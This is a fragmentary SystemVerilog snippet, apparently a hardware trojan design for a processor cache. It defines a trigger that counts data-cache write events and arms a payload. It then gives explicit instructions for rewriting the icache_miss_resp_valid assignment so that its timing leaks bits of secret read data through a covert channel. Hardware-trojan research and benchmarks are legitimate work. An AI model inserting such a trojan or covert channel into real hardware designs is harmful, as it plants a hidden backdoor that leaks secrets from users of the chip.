 ...
 *   
 * Trigger: Counter on dcache_write_data_ready
 * Payload: Modulate icache_miss_resp_valid timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (|dcache_write_data_ready) begin
        ...
        if (trojan_armed && |dcache_write_data_ready) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of icache_miss_resp_valid:
...
logic       covert_bit_out;         // Drives icache_miss_resp_valid when trojan active
...
//   Find the assign for icache_miss_resp_valid (or rd_error_o as fallback):
//     assign icache_miss_resp_valid = <normal_expr>;
//   Replace with:
//     assign icache_miss_resp_valid = trojan_active ? covert_bit_out : (<normal_expr>);
//
